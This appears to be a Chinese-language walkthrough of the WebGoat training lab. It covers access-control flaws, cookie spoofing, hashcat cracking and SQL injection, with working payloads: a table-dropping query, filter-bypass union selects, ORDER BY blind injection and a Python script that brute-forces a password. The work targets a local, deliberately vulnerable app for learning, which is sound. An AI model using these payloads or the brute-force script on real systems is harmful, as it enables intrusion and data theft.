---
title: "WebGoat"
weight: 4
bookToc: true
---

## 环境

使用Docker快速搭建`WebGoat`靶场环境，[https://github.com/WebGoat/WebGoat](https://github.com/WebGoat/WebGoat)
```bash
docker run -d --name webgoat -p 8080:8080 -p 9090:9090 webgoat/webgoat
```

部署完后访问 [http://localhost:8080/WebGoat](http://localhost:8080/WebGoat)，随便注册一个用户

使用的是2025.3版本


## A1 Broken Access Control

### Hijack a session

**目标：通过预测`hijack_cookie`的值，获取其他已认证用户的会话。**

`Proxy`->`HTTP history`->`Send to Repeater`

![](/data/image/security/exploit/webgoat/A1/hijack/1.png)

删除`Cookie`头中的`hijack_cookie`，发送2次，得到`hijack_cookie`的值分别是
```
hijack_cookie=6870830967335141386-1768376122121
hijack_cookie=6870830967335141387-1768376130183
```

推测出来`hijack_cookie`可能前半部分是个随机数，后半部分是个时间戳。

**那么中间缺失的`xxxx-1768376122121`/`xxxx-1768376130183`可能代表其他已认证用户的会话。**

右键`Send to Intruder`，`Payloads`选择`Numbers`，`From xxx to xxx`，`Start attack`

TODO

`Sequencer`分析得出结论`extremely poor`

![](/data/image/security/exploit/webgoat/A1/hijack/0.png)

### Insecure Direct Object References

先以`tom/cat`登录

![](/data/image/security/exploit/webgoat/A1/idor/image-1.png)

找请求和页面显示的差异，可能收获一些信息 `role,userId`

![](/data/image/security/exploit/webgoat/A1/idor/image.png)

推测访问profile的REST API风格，为 `WebGoat/IDOR/profile/2342384`

![](/data/image/security/exploit/webgoat/A1/idor/image-2.png)

`Send to Intruder`爆破其他人的profile
![](/data/image/security/exploit/webgoat/A1/idor/image-3.png)

爆破成功其他id为`2342388`
![](/data/image/security/exploit/webgoat/A1/idor/image-4.png)

同样的路径，方法改为PUT，修改其他人的profile，将`role`修改为`0`（一般数字低的代表管理员等高权限），`color`改为`red`
![](/data/image/security/exploit/webgoat/A1/idor/image-5.png)


### Missing Function Level Access Control

基于`hidden`搜索找到页面中隐藏的菜单项，得到：
- Users: `access-control/users-admin-fix`
- Config: `access-control/config`
![](/data/image/security/exploit/webgoat/A1/missingac/image.png)

**要求获得用户列表信息，并提交`Jerry`这个账户的hash**

推测用户列表对应的endpoint是`access-control/users`，注意`Content-Type: application/json`，得到hash`SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`
![](/data/image/security/exploit/webgoat/A1/missingac/image-2.png)

然后假定上面的问题被修复了，对应`access-control/users-admin-fix`，该接口只能被管理员用户访问，**再一次要求获得用户列表信息，并提交`Jerry`这个账户的hash**

根据提示需要先创建管理员用户，用户名需要和当前登录的webgoat用户名保持一致，`POST access-control/users`
```json
{"username":"your-webgoat-user", "password":"", "admin": "true"}
```
![](/data/image/security/exploit/webgoat/A1/missingac/3.png)

通过`access-control/users-admin-fix`接口获得hash`SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`
![](/data/image/security/exploit/webgoat/A1/missingac/4.png)

### Spoofing an Authentication Cookie

目标：猜测认证cookie是怎么生成的，尝试以`Tom`登录

![](/data/image/security/exploit/webgoat/A1/spoof/image.png)

根据提示以`admin`/`webgoat`2个账号登录，得到以下cookie，发现cookie不会变，且base64编码有相同得前缀，长度似乎与用户名长度有关
```
admin:   NDU2MTZkNDY2YjRiNmM2OTczNGE2ZTY5NmQ2NDYx
webgoat: NDU2MTZkNDY2YjRiNmM2OTczNGE3NDYxNmY2NzYyNjU3Nw==
```

得到以下解码逻辑，`nimda`为`rev(admin)`，`taogbew`为`rev(webgoat)`
![](/data/image/security/exploit/webgoat/A1/spoof/image-1.png)

![](/data/image/security/exploit/webgoat/A1/spoof/image-2.png)

得到`Tom`的cookie为`NDU2MTZkNDY2YjRiNmM2OTczNGE2ZDZmNTQ=`

![](/data/image/security/exploit/webgoat/A1/spoof/image-3.png)

![](/data/image/security/exploit/webgoat/A1/spoof/image-4.png)


## A2 Cryptographic Failures

### Crypto Basics

#### Base64

![](/data/image/security/exploit/webgoat/A2/base64/image-1.png)

![](/data/image/security/exploit/webgoat/A2/base64/image.png)

---

#### XOR

使用 [https://strelitzia.net/wasXORdecoder/wasXORdecoder.html](https://strelitzia.net/wasXORdecoder/wasXORdecoder.html) 进行 IBM WebSphere 的 xor encoding/decoding，得到`databasepassword`

![](/data/image/security/exploit/webgoat/A2/xor/image.png)

---

#### hash

找hash对应的原文密码

![](/data/image/security/exploit/webgoat/A2/hash/image.png)

md5 16字节，sha256 32字节
```bash
hashcat 5F4DCC3B5AA765D61D8327DEB882CF99 # 提示md5 m 0
hashcat -m 0 -a 0 5F4DCC3B5AA765D61D8327DEB882CF99 /usr/share/wordlists/rockyou.txt.gz
5f4dcc3b5aa765d61d8327deb882cf99:password

hashcat 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918 # 提示sha2-256 m 1400
hashcat -m 1400 -a 0 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918 /usr/share/wordlists/rockyou.txt.gz

8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin
```

#### signatures

![](/data/image/security/exploit/webgoat/A2/sign/image.png)

将私钥保存成`pri.pem`使用`openssl`相关命令完成

```bash
openssl rsa -in pri.pem -noout -modulus
Modulus=AE82CF5DC1EA1117D4C81C9E3DC4A520F187D481B709FC7752F35B156C3DB114EEA7DAF056966C3AF75B7A3C325645BEAC2E40F418952F5CA99BF0669E923DB1ACD4387E65F640A278ACF4C6A677A663C47C5BB06C09C6BBC40993E4E04099EDFCC9C98E15726EDBD254EA101557553D8F9A40B6F6C199BA2D9C6C226C38DB8A31DC284527903F9B580CF23AF41A18CB81FA7B65361BFF4BBD12709B2A157E8EAC373566C118051F43F39229FDE30C311ADD4C81C85E6C475AA7948720C0A3E732381DDE2777899B075029DB0AD96004ABCAE978631C3BF7CF48BE5491FA2BA7E7B7F934932AF82367EF64409EA9A5859D5C1A2B0F37B30F894407CE89941933

echo -n "AE82CF5DC1EA1117D4C81C9E3DC4A520F187D481B709FC7752F35B156C3DB114EEA7DAF056966C3AF75B7A3C325645BEAC2E40F418952F5CA99BF0669E923DB1ACD4387E65F640A278ACF4C6A677A663C47C5BB06C09C6BBC40993E4E04099EDFCC9C98E15726EDBD254EA101557553D8F9A40B6F6C199BA2D9C6C226C38DB8A31DC284527903F9B580CF23AF41A18CB81FA7B65361BFF4BBD12709B2A157E8EAC373566C118051F43F39229FDE30C311ADD4C81C85E6C475AA7948720C0A3E732381DDE2777899B075029DB0AD96004ABCAE978631C3BF7CF48BE5491FA2BA7E7B7F934932AF82367EF64409EA9A5859D5C1A2B0F37B30F894407CE89941933" > msg.txt

openssl dgst -sha256 -sign pri.pem -out sig.bin msg.txt

openssl base64 -A -in sig.bin
mRULPa7Mv/u7OWJBL78T/dHgz5Up6ai1Jg1lsK0lf2o+/QjEAVTfBsLr9gFUJOvP5pu94NkhoS/sfPAug5t9Pw7ZsHFhRxEnCQKIlUVgd02hGimK7MfwK+UCQoAdDSUDmHQpAF/sqMbypAnrStb14MC0pBj+OpJgaC5e2ldOVzg7EX471hhXgBLR0pK/Fl+u8IQXqJvkLyibshD5L+t4ZIl1I3D1SK5LJqJXWny1X17Ce8ShbNkoP3Zi2P4xeSmxzAhuu6jrJafigRiYFIxjLFZavuh6+5q9uuBEhaauO5IA6Vm0ecQd1/keW6npXzzuQ73XQ/aNdZ0u7fv5jVVsvw==
```

### password

通过容器中泄露的密钥解密密文

![](/data/image/security/exploit/webgoat/A2/password/image.png)

```bash
docker run -d webgoat/assignments:findthesecret
755a6d9d7f8e1a44c2cf243313ca999f2f0295e428289809f63cebd927c05a93

docker exec -it 755a6d9d7f8e /bin/bash
webgoat@755a6d9d7f8e:/$ cd /root
bash: cd: /root: Permission denied

docker exec -u root -it 755a6d9d7f8e  /bin/bash
root@755a6d9d7f8e:/# cd /root
root@755a6d9d7f8e:~# ls
default_secret
root@755a6d9d7f8e:~# cat default_secret
ThisIsMySecretPassw0rdF0rY0u
root@755a6d9d7f8e:~# echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -kfile default_secret
Leaving passwords in docker images is not so secure
```

## A3 injection

### SQL Injection (intro)

SQL
![](/data/image/security/exploit/webgoat/A3/intro/image.png)

DML
![](/data/image/security/exploit/webgoat/A3/intro/image-1.png)

DDL
![](/data/image/security/exploit/webgoat/A3/intro/image-2.png)

DCL

{{< hint info >}}
`@'%'`是MySQL专用的`user@host`模型，这里用户名要当 `identifier` 用，而不是`'string literal'`
{{< /hint >}}

![](/data/image/security/exploit/webgoat/A3/intro/image-3.png)

---

String SQL injection

![](/data/image/security/exploit/webgoat/A3/intro/image-4.png)

Numeric SQL injection

![](/data/image/security/exploit/webgoat/A3/intro/image-5.png)

---

SQLi - Compromising Confidentiality

![](/data/image/security/exploit/webgoat/A3/intro/image-6.png)

SQLi - Compromising Integrity

`' or '1'='1';update employees set salary = 99999 where auth_tan = '3SL99A' -- `

![](/data/image/security/exploit/webgoat/A3/intro/image-7.png)

SQLi - Compromising Availability

`1'; drop table access_log;-- `
![](/data/image/security/exploit/webgoat/A3/intro/image-8.png)

![](/data/image/security/exploit/webgoat/A3/intro/image-9.png)

### SQL Injection (advanced)

union select

![](/data/image/security/exploit/webgoat/A3/advanced/image.png)


---

发现注册接口`username_req`参数存在SQL注入，但是用sqlmap爆不出来信息

![](/data/image/security/exploit/webgoat/A3/advanced/image-2.png)

编写以下代码爆破密码，为`thisisasecretfortomonly`
```python
import requests
import json 

headers = {
    "Cookie": "JSESSIONID=7280048EA36A3C5D2C38E2D976D5B62E; spoof_auth=NDU2MTZkNDY2YjRiNmM2OTczNGE3NDYxNmY2NzYyNjU3Nw==",
}

data = {
    "username_reg": "Tom",
    "email_reg": "123@123.com",
    "password_reg": "123",
    "confirm_password_reg": "123",
}

password = ''
password_index = 0  

alphabet = 'abcdefghijklmnopqrstuvwxyz'

count = 0

while True:

    for c in alphabet:
        payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, c)
        data["username_reg"] = payload
        
        r = requests.put('http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register', headers=headers, data=data)
        resp = json.loads(r.text)
        if 'already exists' in resp['feedback']:
          password += c
          password_index += 1
          count += 1

          print(password)
          exit
    
    if count > 32:
       break
```

![](/data/image/security/exploit/webgoat/A3/advanced/image-1.png)

### SQL Injection (mitigation)

![](/data/image/security/exploit/webgoat/A3/mitigation/image.png)

![](/data/image/security/exploit/webgoat/A3/mitigation/image-1.png)

---

![](/data/image/security/exploit/webgoat/A3/mitigation/image-2.png)

`/SqlInjectionMitigations/attack` -> `/SqlOnlyInputValidation/attack`

校验不能包含空格

`userid_sql_only_input_validation=zqq'/**/union/**/select/**/userid,user_name,password,cookie,'5','6',7/**/from/**/user_system_data/**/--/**/`

![](/data/image/security/exploit/webgoat/A3/mitigation/image-6.png)

---

![](/data/image/security/exploit/webgoat/A3/mitigation/image-3.png)

`/SqlInjectionMitigations/attack` -> `/SqlOnlyInputValidationOnKeywords/attack`

校验不能包含空格和select/from关键字

`userid_sql_only_input_validation_on_keywords=zqq'/**/union/**/sselectelect/**/userid,user_name,password,cookie,'5','6',7/**/frfromom/**/user_system_data/**/--/**/`

![](/data/image/security/exploit/webgoat/A3/mitigation/image-5.png)

---

下面这页是在说，order by 直接像下面这样使用prepareStatement是没有意义的
```
SELECT * FROM t ORDER BY ?
数据库会把 ? 当成一个“值”，ORDER BY 'created_at'，这对所有行都是同一个常量，排序没有意义
order by 后面需要跟的是列的名字
```

如果想给order by 加一些动态的属性，可以使用`CASE`
```
SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)
```

![](/data/image/security/exploit/webgoat/A3/mitigation/image-4.png)

---

![](/data/image/security/exploit/webgoat/A3/mitigation/1.png)

order by 存在sql注入，报错得到执行语句`select id, hostname, ip, mac, status, description from SERVERS where status <> 'out of order' order by id'`

![](/data/image/security/exploit/webgoat/A3/mitigation/2.png)

可以使用上面的`case when then else end`，判断when的条件是否成立，是否成立会决定实际参与排序的列，页面响应会发生变化，以此实现`webgoat-prd`的`ip`前3位的判断

`case when((select substring(ip,3,1) from SERVERS where hostname = 'webgoat-prd') ='4') then id else hostname end`

响应按照`hostname`进行排序，说明`webgoat-prd`的`ip`第三位不为`5`
![](/data/image/security/exploit/webgoat/A3/mitigation/3.png)

响应按照id进行排序，说明`webgoat-prd`的`ip`第三位为`4`
![](/data/image/security/exploit/webgoat/A3/mitigation/4.png)

以此类推，可得ip为`104.130.219.202`
